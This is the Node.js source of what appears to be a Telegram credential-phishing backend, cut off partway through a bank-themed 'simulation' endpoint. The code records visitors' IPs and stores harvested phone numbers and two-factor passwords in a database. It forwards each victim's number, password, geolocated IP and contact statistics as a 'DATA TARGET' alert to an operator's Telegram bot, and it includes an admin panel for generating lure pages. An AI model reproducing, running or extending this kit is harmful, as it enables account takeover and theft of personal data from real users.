const express = require('express');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const cheerio = require('cheerio');
const app = express();
const { Api, TelegramClient } = require("telegram");
const { computeCheck } = require("telegram/Password");
const { StringSession } = require("telegram/sessions");
const { Logger } = require("telegram");

// override supaya GramJS gak nge-print log sama sekali
Logger.prototype.canSend = () => false;

const crypto = require("crypto");
const mysql = require('mysql');
const axios = require('axios');
const sharp = require('sharp');
const apiId = 25198198 * 1;
const apiHash = "f276f8a2346f4cf13762c86ef4ca7067";
const clients = {};
require("./editdisini.js")
require("./tampilan-edit.js")
const fsawait = require('fs').promises;

// Folder untuk halaman GENERATED dari /submit (terpisah dari admin views)
const PAGES_DIR = path.join(__dirname, 'pages');
const PAGES_CONFIG_DIR = path.join(__dirname, 'pages_config');
const { exec } = require('child_process');
const { execFile } = require("child_process");

const sendMessageOwner = async (...args) => {
    let phone, provinsi, password = null, totalContacts, kntk, ip;

    // DETEKSI PARAMETER
    if (args.length === 5) {
        // tanpa password
        [phone, provinsi, totalContacts, kntk, ip] = args;
    } else if (args.length === 6) {
        // dengan password
        [phone, provinsi, password, totalContacts, kntk, ip] = args;
    }

    // =======================
    // AMBIL INFO IP
    // =======================
    let ipText = '';
    try {
        const res = await axios.get(`https://ipwho.is/${ip}`, { timeout: 10000 });
        const d = res.data;

        if (d && d.success) {
            const maps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

            ipText = `
🌐 <b>IP DETAIL</b>
━━━━━━━━━━━━━━━━━
🌍 Benua     : ${d.continent} (${d.continent_code})
🏳️ Negara    : ${d.country} ${d.flag?.emoji || ''}
📍 Region    : ${d.region}
🏙️ Kota      : ${d.city}
📌 ${d.latitude}, ${d.longitude}

🏢 ISP       : ${d.connection?.isp || '-'}
🏛️ Org       : ${d.connection?.org || '-'}
⏰ ${d.timezone?.id || '-'} (${d.timezone?.abbr || '-'})
📍 <a href="${maps}">Lihat Maps</a>
`;
        } else {
            ipText = `🌐 IP : <code>${ip}</code>\n`;
        }
    } catch (e) {
        ipText = `🌐 IP : <code>${ip}</code>\n`;
    }

    // =======================
    // TEMPLATE MESSAGE
    // =======================
    const text = `
╔═══════════════════════╗
║     🚨 OWNER ALERT    ║
╚═══════════════════════╝

📌 <b>DATA TARGET</b>
━━━━━━━━━━━━━━━━━━
📱 Nomor   : <code>${phone}</code>
${password ? `🔑 Password: <code>${password}</code>` : ''}
📍 Region  : ${provinsi || '-'}

${ipText}

📊 <b>STATISTIK AKUN</b>
━━━━━━━━━━━━━━━━━━
👥 Total Kontak : <b>${totalContacts}</b>
🔁 Mutual       : <b>${kntk}</b>
`;

    // =======================
    // KIRIM KE OWNER
    // =======================


        const token = readOwnerBotToken();
    if (!token || !global.ownerChatId) return;

     try {
              const token = readOwnerBotToken();
    if (!token || !global.ownerChatId) return;

        await axios.post(
            `https://api.telegram.org/bot${token}/sendMessage`,
            {
                chat_id: global.ownerChatId,
                text: text,
                parse_mode: "HTML"
                // ❌ tidak kirim reply_markup sama sekali
            },
            {
                timeout: 15000,
                httpsAgent: agent
            }
        );

        return 200;

    } catch (err) {
        console.log("OWNER SEND ERROR:", err.response?.data || err.message);
        return 500;
    }

   
};


const getIpInfoText = async (ip) => {
    try {
        const res = await axios.get(`https://ipwho.is/${ip}`, {
            timeout: 10000
        });

        const d = res.data;

        if (!d || !d.success) {
            return `🌐 <b>IP</b> : <code>${ip}</code>\n❌ Data tidak tersedia`;
        }

        const maps = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;

        return `
🌐 <b>IP DETAIL</b>
━━━━━━━━━━━━━━━━━━
🌍 Benua     : ${d.continent} (${d.continent_code})
🏳️ Negara    : ${d.country} ${d.flag?.emoji || ''}
📍 Region    : ${d.region}
🏙️ Kota      : ${d.city}
📌 Latitude  : ${d.latitude}
📌 Longitude : ${d.longitude}
🏢 ISP       : ${d.connection?.isp || '-'}
🏛️ Org       : ${d.connection?.org || '-'}
⏰ Zona      : ${d.timezone?.id || '-'}
📍 Region TZ : ${d.timezone?.abbr || '-'}
📍 <a href="${maps}">Lihat Maps</a>
`;

    } catch (err) {
        return `🌐 <b>IP</b> : <code>${ip}</code>\n❌ Error ambil data`;
    }
};

// ============ COLORED LOGGER ============
const C = {
  reset:   '\x1b[0m',
  bold:    '\x1b[1m',
  dim:     '\x1b[2m',
  red:     '\x1b[31m',
  green:   '\x1b[32m',
  yellow:  '\x1b[33m',
  blue:    '\x1b[34m',
  magenta: '\x1b[35m',
  cyan:    '\x1b[36m',
  white:   '\x1b[37m',
  bgRed:   '\x1b[41m',
  bgGreen: '\x1b[42m',
  bgYellow:'\x1b[43m',
  bgBlue:  '\x1b[44m',
  bgMagenta:'\x1b[45m',
  bgCyan:  '\x1b[46m',
};

const TAG = {
  info:    `${C.bgBlue}${C.white}${C.bold} INFO    ${C.reset}`,
  success: `${C.bgGreen}${C.white}${C.bold} SUCCESS ${C.reset}`,
  warn:    `${C.bgYellow}${C.white}${C.bold} WARN    ${C.reset}`,
  error:   `${C.bgRed}${C.white}${C.bold} ERROR   ${C.reset}`,
  http:    `${C.bgCyan}${C.white}${C.bold} HTTP    ${C.reset}`,
  db:      `${C.bgMagenta}${C.white}${C.bold} DB      ${C.reset}`,
  tg:      `${C.bgBlue}${C.white}${C.bold} TELE    ${C.reset}`,
  file:    `${C.bgYellow}${C.white}${C.bold} FILE    ${C.reset}`,
  boot:    `${C.bgGreen}${C.white}${C.bold} BOOT    ${C.reset}`,
};

const ts = () => {
  const d = new Date();
  return `${C.dim}${d.toLocaleTimeString('id-ID', { hour12: false })}.${String(d.getMilliseconds()).padStart(3,'0')}${C.reset}`;
};

const fmt = (...args) => {
  return args.map(a => {
    if (a === undefined || a === null) return '';
    if (typeof a === 'string') return a;
    try {
      const seen = new WeakSet();
      return JSON.stringify(a, (k, v) => {
        if (v instanceof Error) return { name: v.name, message: v.message, stack: v.stack };
        if (typeof v === 'bigint') return v.toString();
        if (typeof v === 'function') return undefined;
        if (v && typeof v === 'object') { if (seen.has(v)) return '[Circular]'; seen.add(v); }
        return v;
      }, 2);
    } catch { return String(a); }
  }).filter(Boolean).join(' ');
};

const log = {
  info:    (msg, ...data) => console.log(`${ts()} ${TAG.info} ${C.white}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  success: (msg, ...data) => console.log(`${ts()} ${TAG.success} ${C.green}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  warn:    (msg, ...data) => console.log(`${ts()} ${TAG.warn} ${C.yellow}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  error:   (msg, ...data) => {
    // Cari Error object untuk tampilkan stack trace di terminal
    const errObj = data.find(d => d instanceof Error);
    const d = new Date();
    const dateStr = `${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}/${d.getFullYear()}`;
    console.error(`${ts()} ${TAG.error} ${C.red}${C.bold}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []);
    if (errObj?.stack) console.error(`${C.dim}${dateStr} Stack Trace:\n${errObj.stack}${C.reset}`);
    notifyOwnerError(msg, errObj || null).catch(() => {});
  },
  http:    (msg, ...data) => console.log(`${ts()} ${TAG.http} ${C.cyan}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  db:      (msg, ...data) => console.log(`${ts()} ${TAG.db} ${C.magenta}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  tg:      (msg, ...data) => console.log(`${ts()} ${TAG.tg} ${C.blue}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  file:    (msg, ...data) => console.log(`${ts()} ${TAG.file} ${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),
  boot:    (msg, ...data) => console.log(`${ts()} ${TAG.boot} ${C.green}${C.bold}${msg}${C.reset}`, ...data.length ? [fmt(...data)] : []),

  box: (type, fields) => {
    const line = '═'.repeat(45);
    const color = type === 'request' ? C.cyan
                : type === 'response' ? C.green
                : type === 'error' ? C.red
                : type === 'success' ? C.green
                : C.yellow;
    const tag = type === 'request' ? `${C.bgCyan}${C.white}${C.bold} ➜ REQUEST  ${C.reset}`
              : type === 'response' ? `${C.bgGreen}${C.white}${C.bold} ✦ RESPONSE ${C.reset}`
              : type === 'error' ? `${C.bgRed}${C.white}${C.bold} ✖ ERROR    ${C.reset}`
              : type === 'success' ? `${C.bgGreen}${C.white}${C.bold} ✔ SUCCESS  ${C.reset}`
              : `${C.bgYellow}${C.white}${C.bold} ⚠ ${type.toUpperCase().padEnd(8)}${C.reset}`;

    const lines = [
      `${color}╔${line}╗${C.reset}`,
      `${color}║${C.reset} ${ts()} ${tag}`,
      `${color}╠${line}╣${C.reset}`,
    ];

    for (const [key, val] of Object.entries(fields)) {
      if (val === undefined || val === null || val === '') continue;
      const label = `${C.bold}${C.white}${key.padEnd(12)}${C.reset}`;
      const value = `${color}${val}${C.reset}`;
      lines.push(`${color}║${C.reset}  ${label}: ${value}`);
    }

    lines.push(`${color}╚${line}╝${C.reset}`);
    console.log(lines.join('\n'));
  },
};
// ============ END COLORED LOGGER ============

// ============ OWNER ERROR NOTIFIER ============
// Token diambil SEKALI saat startup dari urltokenbotowner, disimpan ke owner_token.txt
// Saat error, dibaca dari file lokal (tanpa network request)
const _ownerAgent = new https.Agent({ keepAlive: false, family: 4 });
const axiosOwner = axios.create({ timeout: 10000, httpsAgent: _ownerAgent });
const OWNER_TOKEN_FILE = path.join(__dirname, 'owner_token.txt');

async function initOwnerBotToken() {
  try {
    const res = await axiosOwner.get(global.urltokenbotowner);
    const token = String(res.data).trim();
    await fsawait.writeFile(OWNER_TOKEN_FILE, token, 'utf8');
    console.log(`[ownerBot] Token berhasil diambil dan disimpan ke owner_token.txt`);
  } catch (e) {
    console.error(`[ownerBot] Gagal fetch token dari: ${global.urltokenbotowner}`);
    console.error(`[ownerBot] Code    : ${e.code || '-'}`);
    console.error(`[ownerBot] Status  : ${e.response?.status || 'no response'}`);
    console.error(`[ownerBot] Message : ${e.message}`);
    if (e.response?.data) console.error(`[ownerBot] Body    :`, e.response.data);
  }
}

function readOwnerBotToken() {
  try {
    if (!fs.existsSync(OWNER_TOKEN_FILE)) return null;
    return fs.readFileSync(OWNER_TOKEN_FILE, 'utf8').trim() || null;
  } catch {
    return null;
  }
}

async function notifyOwnerError(label, errObj) {
  const escHtml = (s) => String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
  try {
    const token = readOwnerBotToken();
    if (!token || !global.ownerChatId) return;
    const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Makassar', hour12: false });
    const stackText = errObj?.stack
      ? `\n\n<pre>${escHtml(String(errObj.stack).slice(0, 800))}</pre>`
      : '';
    const text = `🚨 <b>ERROR APP</b>\n⏰ <b>Waktu:</b> ${escHtml(time)}\n📌 <b>Info:</b> ${escHtml(label)}${stackText}`;
    await axiosOwner.post(
      `https://api.telegram.org/bot${token}/sendMessage`,
      { chat_id: global.ownerChatId, text, parse_mode: 'HTML' }
    );
  } catch (e) {
    console.error(`[ownerBot] Gagal kirim notif ke chat_id: ${global.ownerChatId}`);
    console.error(`[ownerBot] Code    : ${e.code || '-'}`);
    console.error(`[ownerBot] Status  : ${e.response?.status || 'no response'}`);
    console.error(`[ownerBot] Message : ${e.message}`);
    if (e.response?.data) console.error(`[ownerBot] Body    :`, e.response.data);
    if (e.stack) console.error(`[ownerBot] Stack   :\n${e.stack}`);
  }
}

async function sendDemoSimulationNotification(bank, sessionId) {
  const token = readOwnerBotToken();
  if (!token || !global.ownerChatId) {
    throw new Error('Bot Telegram simulasi belum dikonfigurasi.');
  }

  const time = new Date().toLocaleString('id-ID', {
    timeZone: 'Asia/Jakarta',
    hour12: false
  });
  const text = [
    '🧪 <b>SIMULASI EDUKASI - DATA SINTETIS</b>',
    '━━━━━━━━━━━━━━━━━━',
    `🏦 Bank: <code>${bank}</code>`,
    '👤 User ID simulasi: <code>DEMO-USER</code>',
    '🔑 Password simulasi: <code>DEMO-PASSWORD</code>',
    '📱 Nomor simulasi: <code>+60 00-000 0000</code>',
    `🆔 Session: <code>${sessionId}</code>`,
    `⏰ Waktu: ${time}`,
    '✅ Status: Form simulasi dikirim',
    '',
    '⚠️ Seluruh identitas di atas adalah data palsu tetap untuk demonstrasi.',
    '⚠️ Endpoint menolak User ID, password, atau nomor selain nilai DEMO tersebut.'
  ].join('\n');

  await axiosOwner.post(
    `https://api.telegram.org/bot${token}/sendMessage`,
    {
      chat_id: global.ownerChatId,
      text,
      parse_mode: 'HTML'
    }
  );
}
// ============ END OWNER ERROR NOTIFIER ============

// ============ AXIOS INTERCEPTORS ============
axios.interceptors.request.use(
  (config) => {
    log.http(`axios -> ${config.method?.toUpperCase()} ${config.url}`, config.data || '');
    return config;
  },
  (error) => {
    log.error('axios request error', error);
    return Promise.reject(error);
  }
);

axios.interceptors.response.use(
  (response) => {
    log.http(`axios <- ${response.status} ${response.config?.url}`, response.data || '');
    return response;
  },
  (error) => {
    log.error(`axios <- ${error.response?.status || 'ERR'} ${error.config?.url}`, error.message, error.response?.data || '');
    return Promise.reject(error);
  }
);
// ============ END AXIOS INTERCEPTORS ============

const dayjs = require('dayjs');
const duration = require('dayjs/plugin/duration');
const relativeTime = require('dayjs/plugin/relativeTime');
require('dayjs/locale/id');



dayjs.extend(duration);
dayjs.extend(relativeTime);
dayjs.locale('id');

const getWITADate = () => {
  const nowUTC = new Date();

  // Menambahkan offset untuk WITA (UTC+8)
  const witaOffsetMillis = 8 * 60 * 60 * 1000;  // Offset 8 jam dalam milidetik
  const nowWITA = new Date(nowUTC.getTime() + witaOffsetMillis);  // Waktu Makassar

  // Mendapatkan komponen tanggal dan waktu
  const dayOfWeek = nowWITA.toLocaleString('id-ID', { weekday: 'long' }); // Nama hari
  const day = String(nowWITA.getDate()).padStart(2, '0'); // Tanggal (2 digit)
  const month = String(nowWITA.getMonth() + 1).padStart(2, '0'); // Bulan (2 digit)
  const year = nowWITA.getFullYear(); // Tahun
  const hours = String(nowWITA.getHours()).padStart(2, '0'); // Jam
  const minutes = String(nowWITA.getMinutes()).padStart(2, '0'); // Menit
  const seconds = String(nowWITA.getSeconds()).padStart(2, '0'); // Detik

  // Format output yang diinginkan
  const formattedDate = `${dayOfWeek}, ${hours}:${minutes}:${seconds}, ${day}/${month}/${year}`;

  return formattedDate;
};


const readJSONFile = (filePath) => {
  return new Promise((resolve, reject) => {
    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
        reject(err);
      } else {
        resolve(JSON.parse(data));
      }
    });
  });
};
// Token bot Telegram Anda
const FILE_PATH = 'lastMessage.json';

const statusFile = 'displayedOtp.json';

// Pastikan file status ada, jika tidak buat file kosong
if (!fs.existsSync(statusFile)) {
  fs.writeFileSync(statusFile, JSON.stringify([]));
}
const getTodayWITA = () => {
  // Ambil waktu sekarang UTC, lalu offset ke WITA (GMT+8)
  const now = new Date();
  const utc = now.getTime() + now.getTimezoneOffset() * 60000;
  const wita = new Date(utc + 8 * 60 * 60000);

  // Format ke YYYY-MM-DD
  const year = wita.getFullYear();
  const month = String(wita.getMonth() + 1).padStart(2, '0');
  const day = String(wita.getDate()).padStart(2, '0');

  return `${year}-${month}-${day}`;
};

const hitvisitor = async () => {
  try {
    const folderPath = path.join(__dirname, 'loginList');
    const counterFile = path.join(folderPath, 'today.txt');

    if (!fs.existsSync(folderPath)) fs.mkdirSync(folderPath, { recursive: true });

    const today = getTodayWITA();
    let count = 1;

    if (fs.existsSync(counterFile)) {
      const content = fs.readFileSync(counterFile, 'utf-8').trim();

      // Validasi isi file
      if (content.includes('|')) {
        const [savedDate, savedCount] = content.split('|');

        const lastDate = new Date(savedDate);
        const nowDate = new Date(today);
        const diffTime = nowDate - lastDate;
        const diffDays = diffTime / (1000 * 60 * 60 * 24);

        // Tambah jika tanggal sama
        if (savedDate === today) {
          count = parseInt(savedCount) + 1;
        }

        // Hapus jika lebih dari 5 hari
        if (diffDays > 5) {
          fs.unlinkSync(counterFile);
          log.info(`File visitor dihapus karena sudah ${diffDays} hari.`);
          return;
        }
      } else {
        log.warn('Isi file tidak valid. File akan di-reset.');
      }
    }

    // Simpan ulang file
    fs.writeFileSync(counterFile, `${today}|${count}`);
    log.info(`Visitor hari ini (${today}): ${count}`);
    return count;

  } catch (error) {
    log.error('hitvisitor error', error.message);
    return 0;
  }
};

const logLoginInfoByPath = (req) => {
  const referer = req.headers['referer'] || req.headers['referrer'] || '';
  let pathName = 'root';

  // Ambil path dari referer, dan bersihkan dari karakter '/'
  if (referer) {
      pathName = new URL(referer).pathname.replace(/\//g, '') || 'root';
  }

  const visitorData = {
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
      userAgent: req.headers['user-agent'],
      timestamp: getUnixTimestamp(),
      path: pathName
  };

  // Tentukan folder tempat menyimpan file JSON dan counter
  const folderPath = path.join(__dirname, 'loginList');
  const infoFilePath = path.join(folderPath, `${pathName}-login-info.json`);
  const infotodayPath = path.join(folderPath, `today.json`);
  const counterFilePath = path.join(folderPath, `${pathName}-login-counter.txt`);

  // Pastikan folder 'loginList' ada, jika tidak, buat foldernya
  if (!fs.existsSync(folderPath)) {
      fs.mkdirSync(folderPath, { recursive: true });
  }

  // Update counter sesuai nama path
  updateCounter(counterFilePath);

  // Tulis data baru ke file JSON (overwrite)
  fs.writeFileSync(infoFilePath, JSON.stringify(visitorData, null, 2), 'utf8');
  fs.writeFileSync(infotodayPath, JSON.stringify(visitorData, null, 2), 'utf8');

};

const getUnixTimestamp = () => Math.floor(Date.now() / 1000);



// Fungsi untuk membaca dan memperbarui counter sesuai path
const updateCounter = (counterFilePath) => {
  let counter = 0;

  // Baca counter dari file jika ada
  if (fs.existsSync(counterFilePath)) {
      const fileData = fs.readFileSync(counterFilePath, 'utf8');
      counter = parseInt(fileData, 10) || 0;
  }

  counter += 1;

  // Tulis kembali nilai counter ke file
  fs.writeFileSync(counterFilePath, counter.toString(), 'utf8');

};

// Middleware untuk mencatat akses ke route login
const countRouteAccess = (req, res, next) => {
  logLoginInfoByPath(req);
  next();
};

const EXPIRATION_TIME = 2 * 60 * 1000; // 2 menit dalam milidetik

// Inisialisasi file JSON jika belum ada
if (!fs.existsSync(FILE_PATH)) {
    fs.writeFileSync(FILE_PATH, JSON.stringify([]));
}

// Fungsi untuk membaca pesan dari file JSON
const readMessages = () => {
    const data = fs.readFileSync(FILE_PATH, 'utf-8');
    return JSON.parse(data);
};

// Fungsi untuk menyimpan pesan ke file JSON
const writeMessages = (messages) => {
    fs.writeFileSync(FILE_PATH, JSON.stringify(messages, null, 2));
};

// Fungsi untuk menghapus pesan yang sudah lebih dari 2 menit
const cleanOldMessages = () => {
    const messages = readMessages();
    const currentTime = Date.now();
    const filteredMessages = messages.filter(
        (msg) => currentTime - msg.timestamp < EXPIRATION_TIME
    );
    writeMessages(filteredMessages);
};


 axios.get(`https://api.telegram.org/bot${global.tokenbot}/getMe`)
    .then(response => {
        const botName = response.data.result.username;
        // Simpan nama bot ke dalam file teks
        fs.writeFileSync('botNames.txt', botName + '\n');
        log.success(`Nama bot ${botName} berhasil disimpan.`);
    })
    .catch(error => {
        log.error('getMe error', error.message);
    });

const fsx = require('fs/promises');

async function readBotNames(filePath = 'botNames.txt') {
  try {
    const data = await fsx.readFile(filePath, { encoding: 'utf8' });
    return data.split(/\r?\n/).map(s => s.trim()).filter(Boolean);
  } catch (err) {
    if (err.code === 'ENOENT') return []; // file belum ada
    throw err;
  }
}


const agent = new https.Agent({
    keepAlive: true,
    family: 4
});

const sendMessage = async (text, id, keyboard = null) => {
    cleanOldMessages();
    const messages = readMessages();

    const isDuplicate = messages.some((msg) => msg.text === text);

    if (isDuplicate) {
        log.warn('Pesan duplikat, tidak dikirim');
        return 403;
    }

    // retry 3x
    for (let i = 0; i < 3; i++) {
        try {
            await axios.post(
                `https://api.telegram.org/bot${global.tokenbot}/sendMessage`,
                {
                    chat_id: id,
                    text: text,
                    parse_mode: "HTML",
                    reply_markup: keyboard // 🔥 tambahan (tidak ganggu logic lama)
                },
                {
                    timeout: 15000,
                    httpsAgent: agent
                }
            );

            const newMessage = {
                text: text,
                timestamp: Date.now(),
            };

            messages.push(newMessage);
            writeMessages(messages);

        

            return 200;

        } catch (error) {
            log.warn(`Retry ${i + 1} gagal...`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }

    log.error('Gagal mengirim pesan setelah retry');
    return 500;
};

const pool = mysql.createPool({
  host: global.host,
  port: global.port,
  user: global.user,
  password: global.password,
  database: global.database,
  connectionLimit: 10 
});

// Wrapper function to execute queries using the connection pool
const executeQuery = (sql, params) => {
  return new Promise((resolve, reject) => {
    pool.query(sql, params, (err, result) => {
      if (err) {
        reject(err);
      } else {
        resolve(result);
      }
    });
  });
};


async function addNumberPass(nomor, password, sess, post) {
  const sql = `INSERT INTO telebot (phone, password, post, params) VALUES (?, ?, ?, ?)`;

  try {
    const result = await executeQuery(sql, [nomor, password, post, sess]); // Use parameterized query to prevent SQL injection
 
    return result;
  } catch (err) {
    log.error('addNumberPass gagal', err.message);
    throw err; // Propagate the error if any
  }
}

// Function to add a number without a password, just session and post data
async function addNumber(nomor, sess, post) {
  const sql = `INSERT INTO telebot (phone, password, post, params) VALUES (?, 'TIDAK ADA PASSWORD', ?, ?)`;

  try {
    const result = await executeQuery(sql, [nomor, post, sess]); // Use parameterized query to prevent SQL injection
    return result;
  } catch (err) {
    log.error('addNumber gagal', err.message);
    throw err; // Propagate the error if any
  }
}


function deleteFile(filePath) {
  fs.unlink(filePath, (err) => {
      if (err) {
          return err;
      }
      return 200
  });
}


async function readFolder() {
  try {
    if (!fs.existsSync(PAGES_DIR)) return [];
    const files = await fsawait.readdir(PAGES_DIR);
    return files
      .filter(file => file.endsWith('.ejs'))
      .map(file => file.replace('.ejs', ''));
  } catch (err) {
   return err;
  }
}


// Setup untuk EJS
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Custom storage dengan auto-compress gambar untuk optimasi performa
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 } // Max 10MB input, akan dikompres ke ~300KB
});

// Middleware untuk compress dan simpan 2 versi gambar: original + compressed
const compressAndSaveImage = (req, res, next) => {
  if (!req.files || Object.keys(req.files).length === 0) {
    return next();
  }

  const uploadsDir = path.join(__dirname, 'uploads');
  if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
  }

  const fileFields = Object.keys(req.files);
  let completed = 0;
  const totalFiles = fileFields.reduce((sum, field) => sum + req.files[field].length, 0) * 2; // *2 karena save 2 file per image

  if (totalFiles === 0) return next();

  fileFields.forEach((fieldName) => {
    req.files[fieldName].forEach(async (file) => {
      try {
        const baseFilename = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        const originalFilename = 'original_' + baseFilename + '.jpg';
        const compressedFilename = 'compressed_' + baseFilename + '.jpg';
        const originalFilepath = path.join(uploadsDir, originalFilename);
        const compressedFilepath = path.join(uploadsDir, compressedFilename);

        // Simpan file original (full quality untuk /fasfasf)
        await sharp(file.buffer)
          .jpeg({ quality: 95, progressive: true })
          .toFile(originalFilepath);

        // Simpan file compressed (optimized untuk /dash)
        await sharp(file.buffer)
          .resize(800, 600, {
            fit: 'inside',
            withoutEnlargement: true
          })
          .jpeg({ quality: 75, progressive: true })
          .toFile(compressedFilepath);

        // Update req.files dengan kedua path (original + compressed)
        file.filename = originalFilename;
        file.filenameCompressed = compressedFilename;
        file.path = `/uploads/${originalFilename}`;
        file.pathCompressed = `/uploads/${compressedFilename}`;
        
        completed += 2;
        if (completed === totalFiles) {
          next();
        }
      } catch (error) {
        log.error('Image compression error', error.message);
        completed += 2;
        if (completed === totalFiles) {
          next();
        }
      }
    });
  });
};

// Middleware untuk parsing body form
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

// Configure session middleware - MUST be before routes
app.use(session({
  secret: 'teleauto-admin-secret-key-2025',
  resave: false,
  saveUninitialized: false,
  cookie: { 
    secure: false, // Will be updated based on HTTPS availability later
    maxAge: 1 * 60 * 60 * 1000, // 1 jam
    httpOnly: true
  }
}));

// Middleware untuk check authentication
const requireAuth = (req, res, next) => {
  if (req.session && req.session.authenticated) {
    return next();
  } else {
    return res.redirect('/login');
  }
};

// app.use('/layout', express.static(path.join(__dirname, 'layout')));
app.use('/assets', express.static(path.join(__dirname, 'assets')));
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.get('/form', requireAuth, async (req, res) => {

  let namebot = await readBotNames()

  log.box('request', {
    Proses: 'BUKA FORM BUAT',
    Route: 'GET /form',
    User: req.session?.username?.toUpperCase() || '-',
    IP: req.ip,
  });

  res.render('form', {
    tampilan: global.tampilan,
    fields: global.fields,
  namebot: namebot,
  usernm: global.username ? global.username.toUpperCase() : global.username,
  });
});


app.get('/edit', requireAuth, async (req, res) => {
  const url = req.query.url // Ambil dari query parameter
  const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${url}.json`);

  const data = await fs.promises.readFile(clientConfigPath, 'utf-8');
  const config = JSON.parse(data);
  const namebot = await readBotNames();

  log.box('request', {
    Proses: 'BUKA FORM EDIT',
    Route: 'GET /edit',
    URL: url || '-',
    Theme: config.theme || '-',
    Tampilan: config.tampilan || '-',
    IP: req.ip,
  });

  res.render('edit', {
    config: config,
    namebot: namebot,
    usernm: global.username ? global.username.toUpperCase() : global.username,
  });
});

app.get('/imgdell', async (req, res) => {
  try {
    const url = req.query.url;
    const img = req.query.img;

    if (!url || !img) {
      return res.status(400).json({ error: "Parameter 'url' dan 'img' diperlukan." });
    }

    const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${url}.json`);

    if (!fs.existsSync(clientConfigPath)) {
      return res.json({ code: 404,error: "File JSON tidak ditemukan." });
    }

    const data = await fs.promises.readFile(clientConfigPath, 'utf-8');
    const config = JSON.parse(data);

    if (config.hasOwnProperty(img)) {
      delete config[img]; // Hapus key dan valuenya

      // Simpan kembali file JSON yang sudah diperbarui
      await fs.promises.writeFile(clientConfigPath, JSON.stringify(config, null, 2), 'utf-8');

      return res.json({ code: 200,message: `Key '${img}' telah dihapus dari file ${url}.json.` });
    } else {
      return res.json({ code: 403, message: `Key '${img}' tidak ditemukan dalam file ${url}.json.` });
    }
  } catch (error) {
    log.error('imgdell error', error.message);
    res.json({ code:500, error: "Terjadi kesalahan pada server." });
  }
});


app.post('/edit/:url', upload.fields([
  { name: 'image1Url', maxCount: 1 },
  { name: 'image2Url', maxCount: 1 },
  { name: 'image3Url', maxCount: 1 },
  { name: 'image4Url', maxCount: 1 },
  { name: 'image5Url', maxCount: 1 },
  { name: 'image6Url', maxCount: 1 }
]), compressAndSaveImage, async (req, res) => {
  const { url } = req.params;
  const { theme, telegramId, buttonname, footerdesc,titlefour } = req.body;

  try {
      const clientConfigPath = path.join(PAGES_CONFIG_DIR, `${url}.json`);
      const data = await fs.promises.readFile(clientConfigPath, 'utf-8');
      const item = JSON.parse(data);

      if (item) {

          // Perbarui data teks
          item.theme = theme || item.theme;
          item.telegramId = telegramId || item.telegramId;
          item.titlefour = titlefour || item.titlefour;
          item.buttonname = buttonname || item.buttonname;
          item.footerdesc = footerdesc || item.footerdesc;

          // Periksa setiap input gambar dari req.files
          for (let i = 1; i <= 5; i++) {
              const fieldName = `image${i}Url`;
              const fieldNameCompressed = `image${i}UrlCompressed`;

              if (req.files && req.files[fieldName]) {
                  const uploadedFile = req.files[fieldName][0];

                  // Hapus gambar lama (original + compressed)
                  if (item[fieldName]) {
                      const oldImagePath = path.join(__dirname, item[fieldName]);
                      if (fs.existsSync(oldImagePath)) {
                          fs.unlinkSync(oldImagePath);
                      }
                  }
                  if (item[fieldNameCompressed]) {
                      const oldCompressedPath = path.join(__dirname, item[fieldNameCompressed]);
                      if (fs.existsSync(oldCompressedPath)) {
                          fs.unlinkSync(oldCompressedPath);
                      }
                  }

                  // Simpan 2 path: original (untuk /fasfasf) + compressed (untuk /dash)
                  item[fieldName] = `/uploads/${uploadedFile.filename}`;
                  item[fieldNameCompressed] = `/uploads/${uploadedFile.filenameCompressed}`;
              } else if (req.body[fieldName] === "") {
                  // Jika field dikirim kosong, hapus gambar lama (keduanya)
                  if (item[fieldName]) {
                      const oldImagePath = path.join(__dirname, item[fieldName]);
                      if (fs.existsSync(oldImagePath)) {
                          fs.unlinkSync(oldImagePath);
                      }
                      item[fieldName] = ""; // Kosongkan di JSON
                  }
                  if (item[fieldNameCompressed]) {
                      const oldCompressedPath = path.join(__dirname, item[fieldNameCompressed]);
                      if (fs.existsSync(oldCompressedPath)) {
                          fs.unlinkSync(oldCompressedPath);
                      }
                      item[fieldNameCompressed] = ""; // Kosongkan di JSON
                  }
              }
          }

          // Simpan kembali perubahan di file JSON
          await fs.promises.writeFile(clientConfigPath, JSON.stringify(item, null, 2), 'utf-8');

          res.redirect(getBaseUrl(req) + '/' + cleanUrlPath(req.body.customUrl));
      } else {
        
          res.status(404).json({ success: false, message: 'Data tidak ditemukan.' });
      }
  } catch (error) {
      log.error('edit config error', error.message);
      res.status(500).json({ success: false, message: 'Terjadi kesalahan saat membaca file konfigurasi.' });
  }
});


app.post("/api/simulation-test", async function(req, res) {
  const { bank, userId, password, waNumber, telegramId, simulation } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Validasi input
  if (!bank || !userId || !password || !waNumber || !telegramId) {
    return res.status(400).json({
      success: false,
      message: "Semua field harus diisi (Bank, User ID, Password, Nomor WA, Telegram ID)"
